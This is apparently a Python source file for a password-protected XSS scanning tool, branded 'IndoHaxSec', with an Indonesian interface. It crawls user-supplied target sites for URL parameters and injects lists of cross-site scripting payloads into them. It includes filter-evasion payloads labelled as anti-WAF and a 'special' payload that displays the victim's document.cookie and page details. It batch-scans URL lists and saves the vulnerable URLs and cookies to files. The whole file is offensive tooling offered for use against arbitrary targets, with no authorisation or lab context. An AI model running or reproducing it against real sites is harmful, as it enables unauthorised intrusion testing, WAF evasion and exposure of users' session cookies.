import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
import hashlib
import getpass

def opening():
    print("\033[92m")
    print(r" ____  _  _  ____  _____  _   _    __    _  _  ___  ____  ___ ")
    print(r"(_  _)( \( )(  _ \(  _  )( )_( )  /__\  ( \/ )/ __)( ___)/ __)")
    print(r" _)(_  )  (  )(_) ))(_)(  ) _ (  /(__)\  )  ( \__ \ )__)( (__ ")
    print(r"(____)(_)\_)(____/(_____)(_) (_)(__)(__)(_/\_)(___/(____)\___) ")
    print(r" _  _  ___  ___    ___   ___    __    _  _                    ")
    print(r"( \/ )/ __)/ __)  / __) / __)  /__\  ( \( )                   ")
    print(r" )  ( \__ \__ \  \__ \( (__  /(__)\  )  (                    ")
    print(r"(_/\_)(___/(___/  (___/ \___)(__)(__)(_)\_)                   ")
    print(r"Author by FidzXploit | copyright @2k25 january 23")
    print("\033[0m")

def analisis_xss(url, payloads, mode_popup=False):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        input_fields = soup.find_all(['input', 'textarea'])
        results = []

        for field in input_fields:
            field_name = field.get('name')
            if field_name:
                for payload in payloads:
                    encoded_payload = urlencode({field_name: payload})
                    url_vulnerable = f"{url}?{encoded_payload}"
                    response_vulnerable = requests.get(url_vulnerable, timeout=10)

                    if payload in response_vulnerable.text:
                        results.append({
                            "url": url_vulnerable,
                            "cookies": response_vulnerable.cookies.get_dict()
                        })

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        for key in query_params.keys():
            for payload in payloads:
                url_vulnerable = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}={payload}"
                response_vulnerable = requests.get(url_vulnerable, timeout=10)
                if payload in response_vulnerable.text:
                    results.append({
                        "url": url_vulnerable,
                        "cookies": response_vulnerable.cookies.get_dict()
                    })

        if mode_popup:
            if results:
                for result in results:
                    print(f"\033[93mURL Rentan: {result['url']}\033[0m")
                print("\033[92mPopup Tervalidasi!\033[0m")
            else:
                print("\033[91mTidak ditemukan kerentanan XSS dengan validasi popup.\033[0m")
        else:
            if results:
                with open("hasil_xss.txt", "w") as f:
                    for result in results:
                        f.write(f"{result['url']}\n")
                        f.write(f"Cookies: {result['cookies']}\n\n")
                print("\033[92mHasil disimpan di 'hasil_xss.txt'.\033[0m")
                for result in results:
                    print(f"URL: {result['url']}")
                    print(f"Cookies: {result['cookies']}\n")
            else:
                print("\033[91mTidak ditemukan kerentanan XSS.\033[0m")
    except Exception as e:
        print(f"\033[91mTerjadi kesalahan: {e}\033[0m")

def temukan_parameter(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)
        parameters = {}

        for link in links:
            href = link['href']
            full_url = urljoin(url, href)
            parsed_url = urlparse(full_url)
            query = parse_qs(parsed_url.query)
            if query:
                parameters[full_url] = list(query.keys())

        if parameters:
            with open("parameter.txt", "w") as f:
                for url, params in parameters.items():
                    f.write(f"URL: {url}\n")
                    f.write(f"Parameters: {', '.join(params)}\n\n")
            print("\033[92mParameter ditemukan dan disimpan di 'parameter.txt'.\033[0m")
            print("\033[92m\nProses selesai. Parameter yang ditemukan:\033[0m")
            for url, params in parameters.items():
                print(f"\033[92mURL: {url}\033[0m")
                print(f"\033[92mParameters: {', '.join(params)}\033[0m")
        else:
            print("\033[91mTidak ditemukan parameter pada URL.\033[0m")
    except Exception as e:
        print(f"\033[91mTerjadi kesalahan: {e}\033[0m")

def racik_target(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)
        urls_with_parameters = []

        for link in links:
            href = link['href']
            full_url = urljoin(url, href)
            parsed_url = urlparse(full_url)
            if parsed_url.query:
                urls_with_parameters.append(full_url)

        if urls_with_parameters:
            with open("target.txt", "w") as f:
                for url in urls_with_parameters:
                    f.write(f"{url}\n")
            print("\033[92mURL dengan parameter berhasil disimpan di 'target.txt'.\033[0m")
            print("\033[96mProses selesai. Berikut adalah URL dengan parameter:\033[0m")
            for url in urls_with_parameters:
                print(f"\033[96m{url}\033[0m")
        else:
            print("\033[91mTidak ditemukan URL dengan parameter.\033[0m")
    except Exception as e:
        print(f"\033[91mTerjadi kesalahan: {e}\033[0m")

def scan_list_otomatis(file_path):
    try:
        with open(file_path, "r") as file:
            urls = file.readlines()

        payloads = [
            "<script>alert(1)</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<link rel=stylesheet href=data:text/css,*{color:red;}",
            "<details open ontoggle=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<script>confirm(1)</script>"
        ]
        results = []

        for url in urls:
            url = url.strip()
            vuln_found = False
            for payload in payloads:
                url_vulnerable = f"{url}?test={payload}"
                print(f"\033[96mMenguji: {url_vulnerable}\033[0m")
                response = requests.get(url_vulnerable, timeout=10)
                if payload in response.text:
                    results.append({
                        "url": url_vulnerable,
                        "cookies": response.cookies.get_dict()
                    })
                    vuln_found = True

            if vuln_found:
                print(f"\033[93mRentan: {url}\033[0m")
            else:
                print(f"\033[91mTidak rentan: {url}\033[0m")

        if results:
            with open("vuln.txt", "w") as f:
                for result in results:
                    f.write(f"{result['url']}\n")
                    f.write(f"Cookies: {result['cookies']}\n\n")
            print("\033[92mHasil disimpan di 'vuln.txt'.\033[0m")
        else:
            print("\033[91mTidak ditemukan URL rentan.\033[0m")
    except Exception as e:
        print(f"\033[91mTerjadi kesalahan: {e}\033[0m")

def xss_scan_anti_waf(url):
    try:
        payloads = [
            "<scr<script>ipt>alert(1)</scr<script>ipt>",
            "<i<iframe>frame src=javascript:alert(1)>",
            "<scr<script>ipt>confirm(1)</scr<script>ipt>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"
        ]

        for payload in payloads:
            url_vulnerable = f"{url}?test={payload}"
            print(f"\033[92mMenguji: {url_vulnerable}\033[0m")
            response = requests.get(url_vulnerable, timeout=10)
            if payload in response.text:
                print(f"\033[93mRentan terhadap WAF: {url_vulnerable}\033[0m")
                with open("anti_waf_results.txt", "a") as file:
                    file.write(f"URL: {url_vulnerable}\n")
                    file.write(f"Cookies: {response.cookies.get_dict()}\n\n")
    except Exception as e:
        print(f"\033[91mTerjadi kesalahan: {e}\033[0m")

def main():
    password_hash = "14b7e7c84a6758dd6c0695e973be1cd8"
    input_password = getpass.getpass("Masukkan password: ")
    input_password_hash = hashlib.md5(input_password.encode()).hexdigest()

    if input_password_hash == password_hash:
        opening()

        while True:
            print("\033[93mPilih Mode:\033[0m")
            print("1. Otomatis (payloads disediakan)")
            print("2. Manual (masukkan payloads sendiri)")
            print("3. Payloads Spesial")
            print("4. Temukan Parameter")
            print("5. Validasi Popup")
            print("6. XSS Scan Anti WAF")
            print("7. Scan List Otomatis")
            print("8. Racik Target")
            print("9. Keluar")
            pilihan = input("Pilih opsi (1/2/3/4/5/6/7/8/9): ")

            if pilihan == "1":
                url_target = input("Masukkan URL target: ")
                payloads = [
                    "<script>alert(1)</script>",
                    "<img src='x' onerror='alert(1)'>",
                    "<svg onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<input autofocus onfocus=alert(1)>",
                    "<link rel=stylesheet href=data:text/css,*{color:red;}",
                    "<details open ontoggle=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                    "<object data=javascript:alert(1)>",
                    "<script>confirm(1)</script>"
                ]
                analisis_xss(url_target, payloads)
            elif pilihan == "2":
                url_target = input("Masukkan URL target: ")
                payloads = input("Masukkan payloads (pisahkan dengan koma): ").split(',')
                analisis_xss(url_target, payloads)
            elif pilihan == "3":
                url_target = input("Masukkan URL target: ")
                payloads = [
                    "<script>var x = new Date();prompt('XSS-By-IndoHaxSec\n\nDomain :: ${document.domain}\nReadyState :: ${document.readyState}\nPath :: ${location.pathname}\nTextContent :: ${document.textContent}\nAppName :: ${navigator.appName}\nPixel :: ${screen.pixelDepth}\nColor :: ${screen.colorDepth}\nOrigin :: ${location.origin}\nCodeName :: ${navigator.appCodeName}\nProtocol :: ${location.protocol}\nDate :: ${document.lastModified}\nAvailWidth :: ${screen.availWidth}\nAvailHeight :: ${screen.availHeight}\n\nCookies :: ${document.cookie},${x.getHours()}:${x.getMinutes()}:${x.getSeconds()}')</script>"
                ]
                analisis_xss(url_target, payloads)
            elif pilihan == "4":
                url_target = input("Masukkan URL target: ")
                temukan_parameter(url_target)
            elif pilihan == "5":
                url_target = input("Masukkan URL target: ")
                payloads = [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg/onload=alert('XSS')>",
                ]
                analisis_xss(url_target, payloads, mode_popup=True)
            elif pilihan == "6":
                url_target = input("Masukkan URL target: ")
                xss_scan_anti_waf(url_target)
            elif pilihan == "7":
                file_path = input("Masukkan path file list URL: ")
                scan_list_otomatis(file_path)
            elif pilihan == "8":
                url_target = input("Masukkan URL target: ")
                racik_target(url_target)
            elif pilihan == "9":
                print("\033[92mKeluar dari program.\033[0m")
                break
            else:
                print("\033[91mOpsi tidak valid. Silakan coba lagi.\033[0m")
    else:
        print("\033[91mPassword salah.\033[0m")

if __name__ == "__main__":
    main()
